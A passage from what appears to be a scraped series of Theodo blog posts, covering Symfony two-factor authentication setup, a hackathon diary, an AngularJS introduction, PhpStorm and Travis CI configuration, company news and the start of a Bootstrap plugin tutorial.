        model_manager_name: ~

Also add the configuration for the trusted computer feature. This will allow users to check a “I’m on a trusted computer” box so they could skip the second step the next time they log.

    # app/config/config.yml
    scheb_two_factor:
        # ...
        trusted_computer:
            enabled: true
            cookie_name: two_factor_trusted_computer
            cookie_lifetime: 5184000 # 60 days

If you want to customize the form integration:

    {# src/Acme/AcmeUserBundle/Resources/views/Security/login_validation.html.twig #}
    {% extends ""FOSUserBundle::layout.html.twig"" %}

    {% trans_default_domain 'FOSUserBundle' %}

    {% block fos_user_content %}
        {# the following is just the template proposed in the two-factor-bundle #}
        <form class=""form"" action="""" method=""post"">
            {% for flashMessage in app.session.flashbag.get(""two_factor"") %}
                <p class=""error"">{{ flashMessage|trans }}</p>
            {% endfor %}

            <p class=""label""><label for=""_auth_code"">{{ ""scheb_two_factor.auth_code""|trans }}</label></p>
            <p class=""widget""><input id=""_auth_code"" type=""text"" autocomplete=""off"" name=""_auth_code"" /></p>
            {% if useTrustedOption %}<p class=""widget""><label for=""_trusted""><input id=""_trusted"" type=""checkbox"" name=""_trusted"" /> {{ ""scheb_two_factor.trusted""|trans }}</label></p>{% endif %}
            <p class=""submit""><input type=""submit"" value=""{{ ""scheb_two_factor.login""|trans }}"" /></p>

            {# The logout link gives the user a way out if they can't complete the second step #}
            <p class=""cancel""><a href=""{{ path(""_security_logout"") }}"">Cancel</a></p>
        </form>
    {% endblock fos_user_content %}

At last, implement a proper user for this to work:

    // src/Acme/AcmeUserBundle/Entity/User.php
    <?php

    namespace Acme\AcmeUserBundle\Entity;

    use FOS\UserBundle\Model\User as BaseUser;
    use Doctrine\ORM\Mapping as ORM;
    use Scheb\TwoFactorBundle\Model\Email\TwoFactorInterface;
    use Scheb\TwoFactorBundle\Model\TrustedComputerInterface;

    /**
     * @ORM\Table(name=""acme_user"")
     * @ORM\Entity()
     */
    abstract class User extends BaseUser implements TwoFactorInterface, TrustedComputerInterface
    {
        /**
         * @var integer
         *
         * @ORM\Column(name=""id"", type=""integer"")
         * @ORM\Id
         * @ORM\GeneratedValue(strategy=""AUTO"")
         */
        protected $id;

        /**
         * @var string
         *
         * @ORM\Column(name=""phone_number"", type=""string"", length=255)
         */
        protected $phoneNumber;

        /**
         * @ORM\Column(name=""auth_code"", type=""integer"", nullable=true)
         */
        private $authCode;

        /**
         * @ORM\Column(name=""trusted"", type=""json_array"", nullable=true)
         */
        private $trusted;

        public function setPhoneNumber($phoneNumber)
        {
            $this->phoneNumber = $phoneNumber;

            return $this;
        }

        public function getPhoneNumber()
        {
            return $this->phoneNumber;
        }

        /*
         * Implement the TwoFactorInterface
         */

        public function isEmailAuthEnabled() {
            return true; // This can also be a persisted field but it is enabled by default for now
        }

        public function getEmailAuthCode() {
            return $this->authCode;
        }

        public function setEmailAuthCode($authCode) {
            $this->authCode = $authCode;
        }

        /*
         * Implement the TrustedComputerInterface
         */

        public function addTrustedComputer($token, \DateTime $validUntil)
        {
            $this->trusted[$token] = $validUntil->format(""r"");
        }

        public function isTrustedComputer($token)
        {
            if (isset($this->trusted[$token])) {
                $now = new \DateTime();
                $validUntil = new \DateTime($this->trusted[$token]);
                return $now < $validUntil;
            }

            return false;
        }
    }



4. Test your work

In a behat scenario we want to do things like this:


    Scenario: Login through login form
        Given I am on ""/login""
        When I fill in ""username"" with ""admin""
        And I fill in ""password"" with ""admin""
        And I press ""_submit""
        Then I fill the form with the validation code
        And I press ""_submit""
        Then the url should match ""/home""

Here is the custom behat step to do so:

    // Features/Context/FeatureContext.php
    /**
     * @Then /^I fill the form with the validation code$/
     */
    public function iFillTheValidationCodeForm()
    {
        $profiler = $this->getContainer()->get('profiler');
        $result = $profiler->find(null, null, 1, ""POST"", null, null);
        $profile = $profiler->loadProfile($result[0]['token']);

        $collector = $profile->getCollector('swiftmailer');
        $code = $collector->getMessages()[0]->getBody();
        return array(
            new Step\When('I fill in ""_auth_code"" with ""'.$code.'""')
        );
    }



Resources
Have a look at Christian Scheb Blog
Special thanks to scheb and javihernandezgil for their fantastic work and availability.



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Raphaël Dubigny
  			
  				Raphaël is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  			
  		
    
			

									"
"
										Hackathon@42 #SocieteGenerale
Last week-end (23rd-25th May 2014) was an industrious one: our dream team (Adlen, David and Jean-Rémi) participated in Société Générale’s first hackathon in the brand new information-technology school 42.
The theme was inspiring: “a hackathon by devs for devs”. Imagining tools oftomorrow’s IT departments in big companies like SG.
Friday, May 23rd
19h45: Arrival at the “Ecole 42”, we just have enough time to grab a drink before heading to the conference room.
20h: BeMyApp and Société Générale staff introduce the weekend planning and then anyone with an idea gets 1 minute to pitch it. The heads of SG’s IT Department remind everyone of the hackathon’s focus and insist heavily on “continuous delivery” topics as the main challenge for tomorrow.
20h36: Fire alarm sets off in the school. Who started off a barbecue in the basement?!
20h53: Back to pitches but without electricity so no more slides or microphones. Fortunately, everyone remains really quiet.

~21h30: It took David 40 seconds to pitch the idea we had the day before: IT departments want to develop and deploy faster to build products that better fit their clients’ needs. To encourage their collaborators to implement the methods leading to continuous delivery, they need a synthetic overview of their projects with relevant metrics: time since last deployment or release, evolution of deployment frequency, continuous integration and so on. It’s like Google Analytics, but with development metrics instead of only usage metrics.
21h45: End of pitches and dinner. We find the name of our project, Devops Metrix, while eating sushis and talking to cool people. It’s a mix of matrix and metrics so it sounds kinda cool.
22h30: Hackathon begins. We head to one of the school’s “clusters”, where around 250 iMacs stand. Space optimization is quite impressive. So impressive that it’s difficult to put our laptops on the desks and use wired connection at the same time.

22h32: Our repository is created on Github and everyone is added as collaborator.
22h47: OpenStack instance: up. Nginx server: configured. Project’s landing page: online (at the time, it’s only “`Devops Metrix“`). We’re in  production.
We love DevOps spirit <3
22h50: First User Story written on Trello. Here is our board (in French).
23h14: Automatic deployment script with Capistrano running. It’s so cool to be in production before everyone else that we decide we’ve coded enough for the night. Let’s take a step back and think about what we need to code and prioritize our user stories. 
23h47: Let’s leave to get some sleep, or go clubbing!

Saturday, May 24th
9h30: Back to start the first full day. Compared to a few very brave competitors, the three of us are well rested (even after clubbing!). We have already decided which technologies to use for this hackathon, the choice was easy since they are our daily tools:

Angular.js for the front
Bower to handle dependencies
Gulp.js as build system
D3.js to render the visualization
Capistrano for continuous deployment
A VM on OpenStack as server
CoffeeScript, Jade and Less for clean syntax

10h12: We’ve just ended the basic bootstrapping of our Angular app using Gulp.js (You can find David’s book on Gulp.js here). Let’s take a moment for some coffee or tea before ending the import of our dependencies like Bootstrap or Angular routes.
11h30-50: We love Scrum so much that even for less than 2 days we decide to use its principles. We make our sprint planning meeting for the first iteration. Well, we will only make reviews for this hackathon. The planning was only our feeling on what can be done during the given time. Let’s write our user stories and then pick our sprint goal: “Having a functional home page displaying the projects and a couple of metrics”.
11h53: We do not want to use the iMacs to code but we pick two of them, one to display our Trello board and the second one to display our live website. It is really cool to display them on those large screens.
Now let’s write some code! Since our project focuses on the display of projects Adlen and Jean-Rémi pair-program to develop the fixtures generation and the basic display of the project as a list. Meanwhile, David handles the first design of the app and the caption. Then we “ter-program” on the scatter plot display to grasp all together our core feature. We are now all able to improve the visualization of our bubbles.

14h29: BeMyApp organizes 4 code challenges during this hackathon with prizes. The first one starts in one minute! It is algorithmic challenges in JavaScript.
14h35: We’ve just won a Nerf! It is difficult to remember JavaScript syntax since we are so used to CoffeeScript <3
15h23: Our bubbles are now successfully updated each 100ms without freezing the whole application, yeah!
15h29: Code Challenge in one minute !
15h33: We’ve just won a Nerf!
16h11: A mentor from Société Générale comes and gives us valuable insight. He suggests that we add a usage chart in the application’s details page. His point is that since our tool allows managers to monitor applications from the very beginning of their development, it should also show when an application is no longer used. This metric is very valuable for the decision making process enabled by our tool. For instance, if an application is no longer used, the manager could decide to cut its budget and reallocate it to another project.
19h00-30: Our first sprint is over. We’ve managed to do all our stories. Great. We may now start our second sprint, the goal of which is “When I zoom on a project I can see the KPIs of this project, updated in real time”
We are so thrilled by the project, the atmosphere is great, we love our dashboard and we can do what we want with it. It is so good to be a developer.
21h18: Time to have dinner! The Champion’s league finale was streamed live in the common space, sweet!
0h30: Our second sprint is over. Let’s leave to get some sleep!
Sunday, May 25th
10h30: Back to work, a bit later than yesterday because of the European elections.
10h30-10h40: We start this last day with our last sprint meeting, this one will be really short. The competition ends in about 5 hours and we have to prepare our pitch. The sprint goal is to improve our design based on Charlotte’s feedback.
10h53: Maud from BeMyApp offers us to participate in the “Draw my app” workshop, a 90 seconds presentation with a live drawing of the app to practice our pitch. Adlen is chosen to handle this task.

10h59: Code Challenge in one minute !
11h08: We’ve just won a Nerf!
14h29: Code Challenge in one minute!
14h42: Wait… this challenge is really hard, we have to find how the input is encrypted. It looks like Caesar cipher but with some weird adding of spaces and points.
15h: We decide that preparing our pitch has the highest priority level. We thus stop wasting time on the challenge. Jean-Rémi is ending our design. David had already begun to write some slides a couple hours ago. We chose to use only simple slides to introduce the metrics we used.
Now let’s rehearse the presentation. Oh wait… 7 mentors from Société Générale are around us, asking for a demo and explanation of our dashboard. They appreciate it and ask very relevant questions, starting a constructive discussion about their work methodology, sweet.
15h45: Code Challenge now! Only one person found the previous solution, so here is a simpler exercise.
15h46: We’ve just won a Nerf! This one was quite easy :p
15h48: Time to go back to the conference room.
16h: The pitch contest starts! We will be the 7th out of 26 teams. Here are our presentation slides, we will have 3 minutes to pitch (questions included)
16h28: It is our turn!

16h28: Wow, 3 minutes is really short.
18h: The pitches end on time. It’s time for the jury to deliberate.
19h14: The jury have chosen their top 3. The suspense is not long, the three winners are:

Anthill, a suggestion box
Vivamus, a collaborative coding tool like nitrous.io or Codebox
Sheldon, “Pocket for developers”

The jury was composed of top executives at Société Générale whereas the coaches were managers or developers.
We were a bit surprised of the jury’s choices. On one hand, the coaches expressed deeply technical needs before and during the hackathon. They were mostly project managers and developers. On the other hand, the jury was composed of top executives who seemed to have valued technical aspects less. Such a gap between the needs of each management level is understandable. Strategic alignment is a difficult goal to achieve.
Nevertheless, we enjoyed taking part in this hackathon. We met outstanding teams and very nice people that developed awesome concepts like What I use
or Captain. This weekend gave us the motivation to answer one of our long-identified needs: visualize the status of all our projects. Of course, there remains some work to do before our tool is fully functional but the biggest part is here. Stay tuned for the next release. And come help us connect it to real data on GitHub if you’re interested!
Key takeaways

Find the smallest set of features you need AND the simplest implementation of them (have a look at MVP for more)
Spending some time away from code or sleeping may be an investment worth considering
Know your tools, you neither want nor have time to spend on discovering them
Enjoy!


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Adlen Afane
  			
  				  			
  		
    
			

									"
"
										A few months ago when joining Theodo team, we discovered what JavaScript is really about, and we (Aurélie and David) decided to share on this blog our journey through AngularJS. This framework, developed and supported by no less than Google, is about to (or already has?) change the way we develop web applications today. This series of quick posts aims to guide newbies like we were not so long ago on the path to this really cool and promising technology.

Server-side web application are disappearing
The web is historically dominated by servers. The client only calls an URL, then all the magic happens in the server: it resolves routes, picks values in databases, applies some treatment to it, renders them in a template and finally returns a fully prepared page. If you want other infos, use a link, then you will navigate to another page and all this process recurs.
But this era is coming to an end. Users do not want to refresh a full page each time they trigger a filter or something similar, particularly in a mobile context. To ensure the best UX possible, some code has to be executed client-side. That’s where Javascript comes in. Just put this code in <script> tag, and, as long as the browser is compatible with the version of Javascript you are using, it will execute it.
As we always want more interactivity in our web apps, we find ourselves writing numerous lines of Javascript in our pages. And it starts to become like an horror story: no easy way to test this code, no organization, no reusability… It’s spaghetti code, and it tastes like evil, leading us to many bugs and reducing reliability and confidence in the app.
AngularJS, an organized client-side solution
That’s where AngularJS comes to rescue us, poor jQuery abusers. It introduces itself as a Javascript framework, even if some can argue it looks like a library. It brings server’s code organization to the client. It opens a broad way to tests and reusability. We see it as the best anti-stress for frontend developers.
AngularJS introduces new concepts to frontend development, that seem disturbing at first. Don’t panic: the learning curve is no cliff. We are here to guide you smoothly through all these new concepts. And if you are familiar with server-side frameworks, you’ll recognize some of the architecture.
As AngularJS is quite recent, many aspects of its development are not really standardized yet. We’ll humbly present you our choices regarding practices and organization. Don’t take it as holy words: we encourage you to experiment and make your own opinion about best practices to follow.
We obviously won’t be covering everything about AngularJS in this first chapter, so let’s focus on the very beginning: a short introduction of the different notions you’ll meet when exploring AngularJS.
MVVM: wait what?
AngularJS is a MVVM framework. Sorry… what? MVVM stands for Model View ViewModel framework. It means it uses an architecture divided in three parts:

The model : it represents your data. It consists of JavaScript objects.
The view: it describes what users will see. It’s basically HTML and CSS, with some Angular-flavored markup.
The view-model: it’s the link between the previous two, it exposes model data to the view.

Decoupling all of these leads to separating the business logic from the presentation logic. You’ll discover that it makes your code more reusable and more testable, and you’ll learn soon enough why it’s important. Moreover, AngularJS takes care of keeping all the data updated and synchronized. When the view is modified, the model automatically reflects these changes using the ViewModel. You change the model, the view is also automatically updated the same way. Awe-so-me.
Time for action!
First, take a look at app.js. We just set a module named “app”. For now, just see it as a wrapper for our application, we will talk about modules longer in the next chapter.
Now get to deck.js. This is our model. It’s a very simple one: just a simple JavaScript object (we’ll keep it dead simple for now). As Aurélie is an expert player of Magic The Gathering, we’ll use some of her cards for this example.
Let’s go to deckController.js. We add to our application a controller, which is the view-model part of Angular’s MVVM. A controller defines a scope, which is a bag of variables accessible to the view. For the moment, our controller just adds our model to the scope. Later it could offer some extra functions to manipulate it.
Last but not least, the view: index.html. As you can see, it’s a simple HTML page except for the attributes ng like ng-app=""app"" telling AngularJS it should use our module named “app” to process the part of the page the attribute is on. ng-controller=""deckController"" tells Angular to instantiate this controller and its scope to render the content of the tag, which is a div here. This part of the DOM and the controller scope data are now bound. Surrounding a scope variable like deck in double curly braces will make its value appear in the view.
Step 1
This JSON data is not very user-friendly. We can use another attribute: ng-repeat (which is a built-in function of Angular) to iterate through the deck array. The <li> block will be repeated for each card in deck. ng-repeat syntax is very similar to for … in … block in JavaScript. Let’s simply display the card name and its cost.
Step 2
Now that we’ve seen the binding from the model to the view, let’s demonstrate the other way, and how magically Angular updates all theses bindings. Let’s add a comment field: an input area bound (with ng-model) to the model card.comment, and display its value above it. And now, if you type text into the input, the data is magically updated in the model, leading the view to be updated just above.
Step 3
Previews
In the next chapter, we will talk more about these magic attributes, and how you can build your own. These are named directives, and this is one of the most important concept of AngularJS.
We hope you enjoyed reading this post. See you soon!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Aurelie Violette
  			
  				  			
  		
    
			

									"
"
										The goal of this article is to implement Symfony2 coding style in your PhpStorm editor. This will take you 5 minutes to configure your workspace.
Symfony2 CodeSniffer installation
You can follow this steps to install the Symfony2 standard CodeSniffer using Composer.

Install phpcs:
composer global require ""squizlabs/php_codesniffer=1.*""
You can follow the PHP_CodeSniffer documentation to include it in your project dependencies.
Simply add the composer bin directory to your PATH in your ~/.bash_profile (or ~/.bashrc) by adding this line at the end of the file:
PATH=$PATH:$HOME/.composer/vendor/bin

Before use phpcs command, you must open a new shell or execute this command :
source ~/.bash_profile



		UPDATE (27 Sept 2014): The OpenSky Standards I have used seems to be no longer available. I use this repo instead:
git@github.com:escapestudios/Symfony2-coding-standard.git

Copy, symlink or check out the repo to a folder called Symfony2 inside the phpcs Standards directory:
cd ~/.composer/vendor/squizlabs/php_codesniffer/CodeSniffer/Standards
git clone git@github.com:escapestudios/Symfony2-coding-standard.git Symfony2


Now, your list of installed coding standard should look like this:
phpcs -i
The installed coding standards are PSR1, PSR2, PHPCS, Zend, MySource, Squiz, Symfony2 and PEAR



PhpStorm configuration


Configure PhpStorm to use phpcs
Go to Project Settings (PHP > Code Sniffer). Use this command to find phpcs path: which phpcs and put the result on the PHP Code Sniffer path field. You can test your configuration by clicking on the validate button. Then don’t forget to click on the Apply button.
        
    

Configure PhpStorm inspection to use Symfony2 coding style
Go to Project Settings (Inspection). Select PHP > PHP Code Sniffer validation inspection. In the right panel, you can choose your Coding standard. If Symfony2 does not appear in the drop-down list, click on the refresh button.
        
    

Optional: Change the appearance of the inspection alerts
Return in the PHP Code Sniffer inspection menu. Click on the button with three dots to Edit severities. In the new window, click on the + button to add a new one. Choose a name, PHPCS for example. And apply just a black background. You can do the same for warning validation.

Enjoy!

A Pull Request return for Coding style error? Never!
I usually use the opensky Symfony2 coding style but what is yours?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jonathan Beurel
  			
  				Jonathan Beurel - Web Developer. Twitter : @jonathanbeurel  			
  		
    
			

									"
"
										Docteur PH, le magicien de la recherche chez Theodo, a reçu une lettre frappée du sceau du Ministère de l’Enseignement Supérieur et de la Recherche remplie de bonnes nouvelles.
Theodo a reçu l’agrément Crédit d’impôt innovation (CII) au titre des années 2013, 2014, 2015. Le Crédit d’impôt innovation est une mesure fiscale réservée au PME pour la conception de prototypes ou d’installations pilotes de produits nouveaux.
Concrètement, ces dernières peuvent bénéficier d’un crédit d’impôt allant jusqu’à 20 % des dépenses engagées (dans la limite de 400 000€) avec Theodo pour la réalisation de produits innovants. Le crédit d’impôt est valable dès à présent, y compris pour les dépenses réalisées en 2013 !
Pour plus d’informations, contactez-nous 


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										
L’Association Française des Utilisateurs de Php (AFUP) a élu son nouveau président : il s’agit de Fabrice Bernhard, Directeur technique et co-fondateur de Theodo. 
Thierry Marianne, lead développeur chez Theodo a également été élu au conseil d’administration de l’AFUP.
L’AFUP a pour objectif de promouvoir le savoir-faire francophone autour des technologies liées au langage Php. L’association a entre autres missions celle de répondre aux questions des entreprises sur Php. Tous les ans, le Forum Php réunit les meilleurs spécialistes et développeurs Php en France.
Theodo confirme ainsi sa volonté de s’impliquer pour faire vivre la communauté Php !
Plus d’informations sur le site de l’AFUP 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										
Benoît Charles-Lavauzelle, the CEO and co-founder of Theodo, has been selected to represent French entrepreneurs at the 2014 G20 Young Entrepreneurs Alliance Summit in Australia on July 18th-22nd. Along with some of the most inspiring young entrepreneurs in France, he will meet peers from other member countries, share best practices and develop recommendations to drive entrepreneurship. 
The G20 Young Entrepreneurs’ Alliance (G20 YEA) is a collective promoting youth entrepreneurship as a powerful driver of economic renewal, job creation, innovation and social change. The G20 YEA holds an annual Summit prior to the official B20 and G20 Leader’s Summits. Its goal is to foster entrepreneurship, put forward recommendations to the B20 and G20 and action them in their everyday business. 
Theodo is extremely proud to be part of this year’s edition and to be given an occasion to promote agility, the quality of the French web and to find new ideas to keep on getting better at what we do!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Haguenauer
  			
  				  			
  		
    
			

									"
"
										 

Wanna kick start a project? Wanna get straight to the code as fast as possible, without spending too much time on the overheads (creating tests environments and so on…)? Well, let’s build a quick ready-to-go Travis environment with a mysql database for your tests! 3 minutes starting now!

Travis-GitHub hook configuration
Travis automatically builds virtual machines to run your tests upon request. It has been designed for developers: their virtual machines already come with a good base configuration, leaving you very few work to do to customize it to your needs.
First, log in to Travis with your GitHub account. Travis’ services are free for open source projects, but you will have to pay for private repositories. To automate your tests each time you push a commit to GitHub, you will need to activate the hook between these two services: go to your Travis’ repository list and activate the switch button for the project you want. You do not have anything to configure, everything is done automatically.
There you have a handy link to the GitHub repository’s service hooks authorization. On this page, you can see a list of services that can hook to GitHub. Scroll down and click on “Travis”. I advise you to check that the hook is effectively triggered by pressing the test button, it’s fun and it’s free 😉


Kick-start Travis configuration file
Now that Travis is notified every time you push a commit, it will look for your instructions in the .travis.yml file at the root of the project. Among other things, this file describes what you want to test, how, and what Travis must do before and after the tests. Here is a base ready-to-go Travis configuration file for Symfony2 projects:
php:
    - 5.5

before_script:
  - cp app/config/parameters.yml.travis app/config/parameters.yml
  - composer install
  - php app/console doctrine:database:create --env=test
  - php app/console doctrine:schema:create --env=test
  - php app/console doctrine:fixtures:load -n --env=test

script:
  - phpunit -c app

notifications:
  email:
    -  joinus@theodo.fr 😉


The Travis configuration file’s short explanation
The first lines are self-explanatory, just note that you can specify more PHP versions than only 5.5. After that, you can see the commands we ask Travis to run before it launches his tests:

The first one sets up your Symfony parameters for the test environment.
The only trick to know is that Travis’ machines come with an already-started mysql
service, configured with a “travis” user and no password.
Then goes the typical “composer install” that you can customize to fit your needs
with your favorite options.
And at last the three app/console commands to create an up-to-date database
with your fixtures (for those who need them and activated the bundle).

Under the ‘script’ section, you can define which command(s) should be used to launch the tests. If you do not specify any, Travis default will be ‘phpunit’ without arguments. But in general for Symfony2 projects, your PHPUnit configuration files are in app/.
The last line is used to tell Travis which emails should receive his success/failure notifications for this repository. Pretty useful when you deal with many projects!
For reference, here is what your parameters.yml.travis file should look like:
parameters:
    database_user: travis
    database_password: ~
    # Other parameters
Here it is! The 3-minute explanation is now ending and I hope that it has set your tests on track!
No more excuses for not having an up-and-running continuous integration 😉


 
<!--
/*
:Author: David Goodger (goodger@python.org)
:Id: $Id: html4css1.css 7614 2013-02-21 15:55:51Z milde $
:Copyright: This stylesheet has been placed in the public domain.

Default cascading style sheet for the HTML output of Docutils.

See http://docutils.sf.net/docs/howto/html-stylesheets.html for how to
customize this style sheet.
*/

/* used to remove borders from tables and images */
.borderless, table.borderless td, table.borderless th {
  border: 0 }

table.borderless td, table.borderless th {
  /* Override padding for ""table.docutils td"" with ""! important"".
     The right padding separates the table cells. */
  padding: 0 0.5em 0 0 ! important }

.first {
  /* Override more specific margin styles with ""! important"". */
  margin-top: 0 ! important }

.last, .with-subtitle {
  margin-bottom: 0 ! important }

.hidden {
  display: none }

a.toc-backref {
  text-decoration: none ;
  color: black }

blockquote.epigraph {
  margin: 2em 5em ; }

dl.docutils dd {
  margin-bottom: 0.5em }

object[type=""image/svg+xml""], object[type=""application/x-shockwave-flash""] {
  overflow: hidden;
}

/* Uncomment (and remove this text!) to get bold-faced definition list terms
dl.docutils dt {
  font-weight: bold }
*/

div.abstract {
  margin: 2em 5em }

div.abstract p.topic-title {
  font-weight: bold ;
  text-align: center }

div.admonition, div.attention, div.caution, div.danger, div.error,
div.hint, div.important, div.note, div.tip, div.warning {
  margin: 2em ;
  border: medium outset ;
  padding: 1em }

div.admonition p.admonition-title, div.hint p.admonition-title,
div.important p.admonition-title, div.note p.admonition-title,
div.tip p.admonition-title {
  font-weight: bold ;
  font-family: sans-serif }

div.attention p.admonition-title, div.caution p.admonition-title,
div.danger p.admonition-title, div.error p.admonition-title,
div.warning p.admonition-title, .code .error {
  color: red ;
  font-weight: bold ;
  font-family: sans-serif }

/* Uncomment (and remove this text!) to get reduced vertical space in
   compound paragraphs.
div.compound .compound-first, div.compound .compound-middle {
  margin-bottom: 0.5em }

div.compound .compound-last, div.compound .compound-middle {
  margin-top: 0.5em }
*/

div.dedication {
  margin: 2em 5em ;
  text-align: center ;
  font-style: italic }

div.dedication p.topic-title {
  font-weight: bold ;
  font-style: normal }

div.figure {
  margin-left: 2em ;
  margin-right: 2em }

div.footer, div.header {
  clear: both;
  font-size: smaller }

div.line-block {
  display: block ;
  margin-top: 1em ;
  margin-bottom: 1em }

div.line-block div.line-block {
  margin-top: 0 ;
  margin-bottom: 0 ;
  margin-left: 1.5em }

div.sidebar {
  margin: 0 0 0.5em 1em ;
  border: medium outset ;
  padding: 1em ;
  background-color: #ffffee ;
  width: 40% ;
  float: right ;
  clear: right }

div.sidebar p.rubric {
  font-family: sans-serif ;
  font-size: medium }

div.system-messages {
  margin: 5em }

div.system-messages h1 {
  color: red }

div.system-message {
  border: medium outset ;
  padding: 1em }

div.system-message p.system-message-title {
  color: red ;
  font-weight: bold }

div.topic {
  margin: 2em }

h1.section-subtitle, h2.section-subtitle, h3.section-subtitle,
h4.section-subtitle, h5.section-subtitle, h6.section-subtitle {
  margin-top: 0.4em }

h1.title {
  text-align: center }

h2.subtitle {
  text-align: center }

hr.docutils {
  width: 75% }

img.align-left, .figure.align-left, object.align-left {
  clear: left ;
  float: left ;
  margin-right: 1em }

img.align-right, .figure.align-right, object.align-right {
  clear: right ;
  float: right ;
  margin-left: 1em }

img.align-center, .figure.align-center, object.align-center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.align-left {
  text-align: left }

.align-center {
  clear: both ;
  text-align: center }

.align-right {
  text-align: right }

/* reset inner alignment in figures */
div.align-right {
  text-align: inherit }

/* div.align-center * { */
/*   text-align: left } */

ol.simple, ul.simple {
  margin-bottom: 1em }

ol.arabic {
  list-style: decimal }

ol.loweralpha {
  list-style: lower-alpha }

ol.upperalpha {
  list-style: upper-alpha }

ol.lowerroman {
  list-style: lower-roman }

ol.upperroman {
  list-style: upper-roman }

p.attribution {
  text-align: right ;
  margin-left: 50% }

p.caption {
  font-style: italic }

p.credits {
  font-style: italic ;
  font-size: smaller }

p.label {
  white-space: nowrap }

p.rubric {
  font-weight: bold ;
  font-size: larger ;
  color: maroon ;
  text-align: center }

p.sidebar-title {
  font-family: sans-serif ;
  font-weight: bold ;
  font-size: larger }

p.sidebar-subtitle {
  font-family: sans-serif ;
  font-weight: bold }

p.topic-title {
  font-weight: bold }

pre.address {
  margin-bottom: 0 ;
  margin-top: 0 ;
  font: inherit }

pre.literal-block, pre.doctest-block, pre.math, pre.code {
  margin-left: 2em ;
  margin-right: 2em }

pre.code .ln { color: grey; } /* line numbers */
pre.code, code { background-color: #eeeeee }
pre.code .comment, code .comment { color: #5C6576 }
pre.code .keyword, code .keyword { color: #3B0D06; font-weight: bold }
pre.code .literal.string, code .literal.string { color: #0C5404 }
pre.code .name.builtin, code .name.builtin { color: #352B84 }
pre.code .deleted, code .deleted { background-color: #DEB0A1}
pre.code .inserted, code .inserted { background-color: #A3D289}

span.classifier {
  font-family: sans-serif ;
  font-style: oblique }

span.classifier-delimiter {
  font-family: sans-serif ;
  font-weight: bold }

span.interpreted {
  font-family: sans-serif }

span.option {
  white-space: nowrap }

span.pre {
  white-space: pre }

span.problematic {
  color: red }

span.section-subtitle {
  /* font-size relative to parent (h1..h6 element) */
  font-size: 80% }

table.citation {
  border-left: solid 1px gray;
  margin-left: 1px }

table.docinfo {
  margin: 2em 4em }

table.docutils {
  margin-top: 0.5em ;
  margin-bottom: 0.5em }

table.footnote {
  border-left: solid 1px black;
  margin-left: 1px }

table.docutils td, table.docutils th,
table.docinfo td, table.docinfo th {
  padding-left: 0.5em ;
  padding-right: 0.5em ;
  vertical-align: top }

table.docutils th.field-name, table.docinfo th.docinfo-name {
  font-weight: bold ;
  text-align: left ;
  white-space: nowrap ;
  padding-left: 0 }

/* ""booktabs"" style (no vertical lines) */
table.docutils.booktabs {
  border: 0px;
  border-top: 2px solid;
  border-bottom: 2px solid;
  border-collapse: collapse;
}
table.docutils.booktabs * {
  border: 0px;
}
table.docutils.booktabs th {
  border-bottom: thin solid;
  text-align: left;
}

h1 tt.docutils, h2 tt.docutils, h3 tt.docutils,
h4 tt.docutils, h5 tt.docutils, h6 tt.docutils {
  font-size: 100% }

ul.auto-toc {
  list-style-type: none }

-->

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Reynald Mandel
  			
  				After two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  			
  		
    
			

									"
"
										Bootstrap was created at Twitter in mid-2010 by @mdo and @fat. It provides a lot of UI plugins easy to implement. You’ve probably already used it but have you looked at how it worked? Together, we will try to make another plugin using the same best practices as Twitter. Through this tutorial I will introduce some JavaScript concepts like prototype, data-api or object-oriented programming.
A great way to learn is to work on a concrete example so you will build a jQuery plugin in order to manipulate a Bootstrap progressbar.
See the Pen Bootstrap Progressbar by Jonathan (@jbeurel) on CodePen.

Git: The code used in this tutorial is available on GitHub. You can follow the process step by step by using git tags:

Clone the bootstrap-progressbar-tuto repository:
git clone https://github.com/jbeurel/bootstrap-progressbar-tuto.git


Change your current directory to bootstrap-progressbar-tuto
cd bootstrap-progressbar-tuto

This is your working directory for the rest of this tutorial
You can already see the rendering by opening the index.html file in your web browser

step-0: The DOM
Git: This command resets your working directory to the step 0 of the tutorial:
git checkout -f step-0

Let’s begin by using basically the Bootstrap Progressbar:
<html>
<head>
    <title>Bootstrap Progress Bar</title>
    <link rel=""stylesheet"" href=""//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css"">
</head>
<body>
    <div class=""container"">
        <h1>Bootstrap Progress Bar</h1>

        <div class=""progress"">
          <div class=""progress-bar"" role=""progressbar"" aria-valuenow=""40"" aria-valuemin=""0"" aria-valuemax=""100"" style=""width: 40%;"">
            <span class=""sr-only"">40% Complete</span>
          </div>
        </div>
    </div>

    <script src=""//code.jquery.com/jquery.js""></script>
    <script src=""//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js""></script>
</body>
</html>

You’ve created a simple template that includes Bootstrap assets and displays the static progressbar example provided by Bootstrap
Git: Code Diff
step-1 – The jQuery plugin
Git: Reset the workspace to step 1:
git checkout -f step-1

Next step: Javascript!
Create a new js/progressbar.js file with this code:
!function ($) {

